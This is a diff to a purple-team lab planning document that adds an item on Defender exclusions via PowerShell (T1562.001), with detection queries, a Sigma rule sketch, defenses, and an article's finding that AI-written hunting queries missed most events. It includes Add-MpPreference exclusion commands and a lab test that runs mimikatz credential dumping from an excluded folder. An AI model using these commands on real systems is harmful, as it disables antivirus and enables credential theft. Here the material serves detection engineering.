@@ -114,13 +114,14 @@
 | **Phase 0/3.5/5** | NetExec `coerce_plus` + 5 new modules (`pre2k`, `enum_av`, `get-desc-users`, `winscp`, `rdp`) + `--kdcHost` flag | 🆕 |
 | **Exercise (Standalone)** | CVE-2026-41089 Netlogon RCE (PoC available — pre-auth DC crash) | 🆕 |
 | **Plan 0.8 + Track H (defensive)** | GitHub Actions Supply-Chain Attack Patterns (cache poisoning + tag pollution analog + AI agent guardrails) — Flatt Security 2026-06-24 | ⏳ |
+| **Phase 3 + plan1.7** | Defender Exclusion via PowerShell (T1562.001) — KQL patterns + AI-vs-human finding — Detect FYI 2026-06-24 | ⏳ |
 | **Research** | MSSQL + SCCM CVEs | 🔬 |
 | **Reference** | How We Think about Red Teading | — |
 | | Attack Paths Don't Stop at IdP | — |
 | | dirkjanm.io — AD/Azure Research Blog | — |
 | **Skip** | Don't Jump the Turnstile | ⏭️ |
 
-**Counts:** ✅ Adopted: 24 | ⏳ Pending: 54 | 🔬 Research: 4 | ⏭️ Skip: 1 | Reference: 2 | 🆕 New: 12 | **Total: 97**
+**Counts:** ✅ Adopted: 24 | ⏳ Pending: 55 | 🔬 Research: 4 | ⏭️ Skip: 1 | Reference: 2 | 🆕 New: 12 | **Total: 98**
 
 ---
 
@@ -1150,6 +1151,7 @@ psexec.py -k -no-pass child.cadre.local/Administrator@dc02.child.cadre.local
 | Phase 5+ (Defense Evasion) | 105 | SACL/audit policy manipulation for detection evasion | 🆕 Add — DETECT this in plan1.7 |
 | Cross-cutting (validation) | 106 | Atomic Red Team as validation framework | 🆕 Add — cross-validate manual attacks |
 | Plan 0.8 + Track H | 107 | GitHub Actions Supply-Chain Attack Patterns (cache poisoning + tag pollution analog + AI agent guardrails) — Flatt Security 2026-06-24 | ⏳ Pending — Plan 0.8 expansion F-11/F-12 + CADRE-Strike defensive |
+| Phase 3 + plan1.7 | 108 | Defender Exclusion via PowerShell (T1562.001) — KQL patterns + AI-vs-human finding — Detect FYI 2026-06-24 | ⏳ Pending — Phase 3 attack primitive + plan1.7 §17 detection + Track C Sigma |
 | Phase 5 (Persistence) | 39 | Named Pipe Impersonation | ⏳ Pending — priv-esc via pipe |
 | Phase 5 (Persistence) | 41 | Token Dance | ⏳ Pending — token manipulation persistence |
 | Phase 6 (Persistence) | 11 | Golden/Silver Ticket | ⏳ Pending — enhances Phase 6/7 |
@@ -1246,6 +1248,7 @@ psexec.py -k -no-pass child.cadre.local/Administrator@dc02.child.cadre.local
 | 105 | SACL/audit policy manipulation 🆕 | `auditpol /set /category:"DS Access" /success:disable` (red team perspective) | DETECT in plan1.7: WinSec 4907 + 4719 (audit policy changes) | WinSec 4907/4719 + Elastic KQL cadre-008 |
 | 106 | Atomic Red Team validation 🆕 | `Invoke-AtomicTest T1003.001,T1558.003,T1003.006 -ShowDetails` | Cross-validate manual CAMPAIGNS.md attacks — 1000+ pre-built MITRE ATT&CK tests | Same as the underlying attack (T1003.001 → Sysmon 10, etc.) |
 | 107 | GitHub Actions Supply-Chain patterns ⏳ | `npm publish --tag` + `npm dist-tag add` (analog) / `claude-code-action` defensive config (Track H) | Plan 0.8 F-11/F-12 cache poisoning + tag pollution + CADRE-Strike guardrails | Sysmon EID 1 `npm publish` from non-standard path + Zeek HTTP POST to npm registry |
+| 108 | Defender Exclusion via PowerShell ⏳ | `Add-MpPreference -ExclusionPath "C:\Users\target\AppData\Local\Temp" -ExclusionProcess "mimikatz.exe"` (T1562.001) | Runtime exclusion before mimikatz/AMSI bypass; persistence via Group Policy | WinSec 5001 (Defender config change) + WinSec 4688 (PowerShell cmdlet) + Elastic KQL `process.command_line : "*MpPreference*ExclusionPath*"` |
 | 68 | Azure AD Connect DPAPI Dump ⏳ | `adconnectdump` on dc01 (Cloud Sync) | MSOL credentials → Entra ID bridge | Sysmon EID 1 |
 | 69 | Actor Tokens → Global Admin ⏳ | Request Actor token via PoC | Entra ID Global Admin | Entra audit log |
 | 70 | Cloud Kerberos Trust → DA ⏳ | ROADtools + Hybrid device Kerberos ticket | On-prem DA via cloud | Zeek kerberos.log + Entra log |
@@ -1875,9 +1878,10 @@ psexec.py -k -no-pass child.cadre.local/Administrator@dc02.child.cadre.local
 | 105 | SACL/audit policy manipulation for detection evasion | Phase 5+ (Defense Evasion) | 2026 | 🆕 |
 | 106 | Atomic Red Team as validation framework | Cross-cutting (validation) | 2026 | 🆕 |
 | 107 | GitHub Actions Supply-Chain Attack Patterns | Plan 0.8 + Track H | 2026 | ⏳ |
+| 108 | Defender Exclusion via PowerShell (T1562.001) | Phase 3 + plan1.7 + Track C + Track H | 2026 | ⏳ |
 | 59 | Electron App Backdooring (Loki C2) | Phase 3 | 2026 | ✅ |
 
-**16 new items added (Items 60-75, Dirk-jan blog)**. **Plus Item 59** (Electron backdooring). **Plus Items 76-77** (Onelogon WOOT 2026, fills #76-77 gap). **Plus Items 90-96** (7 modern AD tool updates, 2026-06-24). **Plus Items 97-107** (Skipjack, Onelogon detect ref, NetExec additions, CVE-2026-41089, ADeleg, books #100-101, 5 extracted techniques #102-106, GitHub Actions supply-chain #107). **Total Tier 3: 32.**
+**16 new items added (Items 60-75, Dirk-jan blog)**. **Plus Item 59** (Electron backdooring). **Plus Items 76-77** (Onelogon WOOT 2026, fills #76-77 gap). **Plus Items 90-96** (7 modern AD tool updates, 2026-06-24). **Plus Items 97-107** (Skipjack, Onelogon detect ref, NetExec additions, CVE-2026-41089, ADeleg, books #100-101, 5 extracted techniques #102-106, GitHub Actions supply-chain #107). **Plus Item 108** (Defender Exclusion T1562.001 + Detect FYI 2026-06-24). **Total Tier 3: 33.**
 
 ---
 
@@ -1910,6 +1914,7 @@ This is the running index of all items by source. Updated as items are added.
 | **101** | **Practical Purple Teaming — lab + DFIR reference (DFIR + plan1.7)** | **Chase Petrey, NoStarchPress (`CADRE-Courses/NoStarchPress_extract/Practical_Purple_Teaming-0642572230173/`)** |
 | **102-106** | **5 concrete techniques extracted from reference books** | **Same sources as #100-101** |
 | **107** | **GitHub Actions Supply-Chain Attack Patterns (cache poisoning + tag pollution analog + AI agent guardrails)** | **GMO Flatt Security blog Part 1 (Sato, 2026-06-24)** |
+| **108** | **Defender Exclusion via PowerShell (T1562.001) — KQL patterns + AI-vs-human finding** | **Detect FYI by Alex Teixeira (2026-06-24)** |
 
 **Numbering notes:**
 - #9 missing (Tier 1 skipped during original write — see Tier 1 between #8 WMI and #10 Invisible Tasks)
@@ -3396,6 +3401,134 @@ Detection engineering for the new modules → plan1.7 §17 (paired with CVE-2026
 
 ---
 
+## Defender Exclusion via PowerShell (T1562.001) — Detect FYI 2026-06-24
+
+**Source:** [Testing AI Threat Hunting against Real-World KQL: A Side-by-Side Test](https://detect.fyi/testing-ai-threat-hunting-against-real-world-kql-a-side-by-side-test-4cdda76a5772) by Alex Teixeira, *Detect FYI* publication (Medium), 2026-06-24. 14-min article comparing AI-generated KQL (ChatGPT GPT-5.5 + Claude Sonnet 4.6) vs human-written KQL for hunting PowerShell Defender folder exclusions.
+
+**Why relevant for CADRE:**
+- **Phase 3 (Execution) — real attack primitive:** Run `Add-MpPreference -ExclusionPath "C:\Users\target\AppData\Local\Temp" -ExclusionProcess "mimikatz.exe"` before running mimikatz/AMSI bypass/credential theft. Maps to MITRE **T1562.001** Impair Defenses: Disable or Modify Tools. We disable Defender via `04-vulnerabilities.yml` for the lab, but real-world attackers do this dynamically per-target.
+- **plan1.7 §17 (Detection Engineering) — KQL pattern reference:** The article's 15-line human KQL query is a clean, complete reference for hunting this attack class. Even though we use Elastic (not Defender XDR), the **patterns** port directly:
+  - `arg_max(Timestamp, *)` → Elastic `top_hits` aggregation
+  - `dcount(DeviceId)` for prevalence (NOT `count()` of events) → Elastic `cardinality`
+  - `parse_json(AdditionalFields)["ScriptContent"]` → Elastic `JsonProperty(winlog.event_data.ScriptContent)`
+  - `search in (TableA, TableB) "term"` → Elastic `(TableA:term OR TableB:term)`
+- **AI meta-finding (CRITICAL for CADRE-Strike + DFIR-Nexus):** Author's LLM-generated queries missed 9/12 (75% miss rate). Both LLMs only used `DeviceProcessEvents` (30% of telemetry), missed `DeviceEvents`. Both scoped on `FileName == "powershell.exe"` instead of `ActionType`. **"Use AI to review and improve human queries — not generate from scratch."** Direct validation of our existing Atomic Red Team (#106) cross-validation strategy.
+- **Adds a Sigma rule candidate (Track C):** Article's hunt query + human-improved version is a clean candidate for a Sigma rule for plan1.7 §16 (Sigma Rule Library).
+
+**Attack primitive (T1562.001):**
+```powershell
+# Add user-writable folder to Defender exclusion list
+Add-MpPreference -ExclusionPath "C:\Users\target\AppData\Local\Temp"
+
+# Add specific process (binary name)
+Add-MpPreference -ExclusionProcess "mimikatz.exe"
+
+# Add file extension
+Add-MpPreference -ExclusionExtension ".exe"
+
+# Combine: real attacker's "disable Defender before running payload" recipe
+Add-MpPreference -ExclusionPath "C:\Users\target\AppData\Local\Temp" `
+                 -ExclusionProcess "rundll32.exe" `
+                 -ExclusionExtension ".dll"
+```
+
+**MITRE ATT&CK:**
+- **T1562.001** Impair Defenses: Disable or Modify Tools (primary)
+- **T1059.001** Command and Scripting Interpreter: PowerShell (delivery)
+- **T1106** Native API (Defender COM interface)
+
+**Detections (translatable to Elastic KQL — held for plan1.7 §17):**
+- **Sysmon EID 1 + WinSec 4688:** `powershell.exe` with command line containing `Add-MpPreference` or `Set-MpPreference`
+- **WinSec 5001:** Windows Defender configuration change event
+- **WinSec 5012:** Defender threat detection not occurring
+- **Sysmon EID 13:** Registry modification at `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`
+- **Registry monitoring:** `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\`
+- **Elastic KQL (proposed):** `process.command_line : "*MpPreference*" and process.command_line : "*ExclusionPath*"`
+- **Elastic KQL (proposed):** `event.code : "5001" and winlog.event_data.Category : "Configuration changes"`
+- **Sigma rule (proposed):** `win_defender_folder_exclusion.yml` — pattern: `selection: Product: 'MpSvc' EventID: 5001` + `ExclusionPath contains: "\Users\" OR "\AppData\" OR "\Temp\"`
+
+**CADRE applicability:**
+- **Phase 3 (Execution) — runtime exclusion:** When we run mimikatz/AMSI bypass/GodPotato in lab, we could ALSO test the runtime exclusion primitive. We currently disable Defender via Tamper Protection workaround in `04-vulnerabilities.yml`. The runtime exclusion is a more realistic "blue team" scenario — Defender stays on, but our specific path/process is whitelisted.
+- **Phase 5 (Persistence) — registry-level persistence:** An attacker can persist Defender exclusions via Group Policy or registry. Maps to ACE paths in our `05-ad-attack-surface.yml`.
+- **plan1.7 §17 (Detection Engineering) — direct KQL→Elastic KQL port:** Article's 15-line query is a complete reference. Use as template for our other attack detections.
+- **Track C (Sigma Rule Library):** Generate Sigma rule from the human-improved query.
+- **CADRE-Strike (Track H) — validates HITL pattern:** When AI generates attack steps, expect 75% miss rate on detection coverage. HITL review required for novel attack chains.
+
+**Test plan (Phase 3 — when adding to CAMPAIGNS.md):**
+```powershell
+# On mbr01 as Administrator (or DA context)
+# Pre-check: Defender running, no exclusions
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+
+# Add runtime exclusion (simulating attacker)
+Add-MpPreference -ExclusionPath "C:\Users\analyst_cloud\AppData\Local\Temp"
+Add-MpPreference -ExclusionProcess "mimikatz.exe"
+
+# Verify exclusion applied
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess
+
+# Now run mimikatz from excluded path (should NOT be detected by Defender)
+copy C:\Tools\mimikatz.exe C:\Users\analyst_cloud\AppData\Local\Temp\m.exe
+C:\Users\analyst_cloud\AppData\Local\Temp\m.exe sekurlsa::logonpasswords
+
+# Cleanup: remove exclusions
+Remove-MpPreference -ExclusionPath "C:\Users\analyst_cloud\AppData\Local\Temp"
+Remove-MpPreference -ExclusionProcess "mimikatz.exe"
+```
+
+**Test plan (plan1.7 — detection rule deployment):**
+- Deploy Elastic KQL rule on `logs-endpoint.events.process-*` for `*MpPreference*ExclusionPath*`
+- Deploy Sigma rule (`win_defender_folder_exclusion.yml`) and convert to Elastic KQL via `sigma_translate` MCP tool (DFIR-Nexus D.0.1 Stellar)
+- Validate with Atomic Red Team (#106) test T1562.001
+- Cross-validate against the article's human query logic
+
+**Defenses (blue team):**
+- **Monitor registry:** `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\*` and `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\*`
+- **Block PowerShell Defender cmdlets via Constrained Language Mode** for non-admin users
+- **Alert on WinSec 5001** (Defender config change) — high-fidelity signal
+- **Use Defender Attack Surface Reduction (ASR) rules** to block PowerShell Defender cmdlets: `56a863a9-875e-4185-98a7-b882c64b5ce5` (block Office child process) and similar
+- **Enable Tamper Protection** (we disable it for lab — but real production should have it on)
+- **Audit Defender exclusion lists weekly** via Group Policy + PowerShell log
+
+**Cross-references:**
+- **Item #106 (Atomic Red Team):** T1562.001 is covered by Atomic Red Team test T1562.001-1 — `Invoke-AtomicTest T1562.001 -ShowDetails`
+- **Item #101 (Practical Purple Teaming):** Ch 6 telemetry correlation patterns
+- **plan1.7 §17** (held) — add this to Detection Engineering rules
+- **plan1.7 §16** (held) — Sigma Rule Library candidate
+- **CADRE-Strike (Track H)** — validates HITL requirement
+- **External reference #125** (held) — add to `external-references.md`
+- **Phase 3 + Phase 5** — runtime exclusion as Phase 3 attack + persistence via Group Policy as Phase 5
+
+**Workflow note (2026-06-24 session 12):** Per user "yes add item #108" — added with full Campaign_suggestions entry. Mechanics stub goes to CAMPAIGNS-METADATA.md. KQL→Elastic KQL translation held for plan1.7 §17. Sigma rule candidate held for plan1.7 §16.
+
+### 108. Defender Exclusion via PowerShell (T1562.001) ⏳
+
+**Status:** ⏳ NEW (2026-06-24 session 12). Source: [Detect FYI](https://detect.fyi/testing-ai-threat-hunting-against-real-world-kql-a-side-by-side-test-4cdda76a5772) by Alex Teixeira, 2026-06-24.
+
+**Campaign location:** Phase 3 (Execution) — runtime Defender exclusion as attack primitive. Also Phase 5 (Persistence) — Group Policy push of exclusion lists. NOT in current CAMPAIGNS.md — held for Phase 3 test cycle.
+
+**Phase mapping:**
+| Phase | Application |
+|---|---|
+| Phase 3 (Execution) | Runtime exclusion via `Add-MpPreference` before mimikatz/AMSI bypass |
+| Phase 5 (Persistence) | Group Policy or registry-based exclusion persistence |
+| plan1.7 §17 (Detection Engineering) | KQL→Elastic KQL port + Sigma rule candidate |
+| Track C (Sigma Rule Library) | Generate `win_defender_folder_exclusion.yml` |
+| Track H (CADRE-Strike) | Validates HITL requirement (LLM 75% miss rate) |
+
+**CADRE applicability:**
+- Adds a NEW attack primitive to our campaign that mirrors real-world TTPs
+- Provides a clean detection engineering reference (the article's 15-line human KQL is a complete template)
+- Validates our HITL pattern for AI-generated detection rules
+- Closes a gap — we have Defender DISABLE (`04-vulnerabilities.yml`) but no documented runtime EXCLUSION step
+
+**Status legend for new item:** ⏳ Pending — held for Phase 3 test cycle (after Phase 3.5 verification complete) + plan1.7 §16/§17 deployment.
+
+**Cross-references:** Item #106 (Atomic Red Team — T1562.001), Item #101 (Practical Purple Teaming Ch 6), plan1.7 §16/§17, Track C (Sigma), Track H (CADRE-Strike), External reference #125 (held).
+
+---
+
 ## Next Actions / Parallel Tracks (After Campaign Verification)
 
 These are high-level tracks to pursue **after** the primary campaign (Phases 0-8 + Branches) is fully verified end-to-end. Do not start these until campaign validation is complete.
@@ -3616,5 +3749,7 @@ Phase 4-8: DCSync, RBCD, ADCS, forest trust (all work)
 *Last updated: 2026-06-24 (session 2) — Added 7 modern AD attack tool items (#90-96) based on `docs/internal/references/ad-tools-landscape-2026-06-24.md` research: NetExec (nxc) v1.5.1, bloodyAD v2.5.4, Certipy v5.1.0, DonPAPI v2.0+, lsassy v3.1.16, KrbRelay+KrbRelayUp, BARK (Azure/Entra only). Confirms Bark = BloodHound Attack Research Kit (Azure/Entra ID only, Andy Robbins / SpecterOps, companion to bloodyAD). Counts: 77 → 86 items (24 ✅ / 51 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 4 🆕).*
 
 *Last updated: 2026-06-24 (session 1) — Added items #76 (Onelogon Zero-Channel) and #77 (Onelogon AES-CBC8 Downgrade) — Pădurean WOOT 2026 single-channel NRPC bypass. Fills the #76-77 reserved gap. Supersedes #65 Zerologon Alternative as "still works in 2026" (single-channel NRPC not hardened). Counts: 75 → 77 items (22 ✅ / 48 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref).*
+
+*Last updated: 2026-06-24 (session 12) — Added item #108 Defender Exclusion via PowerShell (T1562.001) — Detect FYI by Alex Teixeira 2026-06-24. Side-by-side AI vs human KQL test: ChatGPT (GPT-5.5) errored, Claude (Sonnet 4.6) had 9/12 false-negatives, human 15-line query caught 12/12. **KQL patterns port to Elastic:** `arg_max(Timestamp, *)` → `top_hits`, `dcount(DeviceId)` for prevalence (NOT `count()`), `parse_json(AdditionalFields)["X"]` → `JsonProperty(winlog.event_data.X)`. **Meta-finding for CADRE-Strike + DFIR-Nexus:** AI generates "syntactically correct, semantically plausible-looking queries that are completely useless in practice" — use AI to review/improve human queries, not generate from scratch. Runtime `Add-MpPreference -ExclusionPath` as Phase 3 attack primitive; persistence via Group Policy as Phase 5. Counts: 97 → 98 items (24 ✅ / 55 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 12 🆕). Tier 3: 32 → 33.*
 
 *Last updated: 2026-06-24 (session 11) — Added item #107 GitHub Actions Supply-Chain Attack Patterns (GMO Flatt Security blog Part 1, Sato 2026-06-24). Maps to Plan 0.8 expansion (F-11 cache poisoning + F-12 tag pollution analog) + Track H (CADRE-Strike defensive guardrails from cline incident). 3 attack patterns: vulnerable trigger injection (Ultralytics, nx), tag pollution + Imposter Commits (tj-actions, trivy), AI agent over-permissioning (cline — uses `anthropics/claude-code-action`). NOT in main AD spine. Counts: 96 → 97 items (24 ✅ / 54 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 12 🆕).*
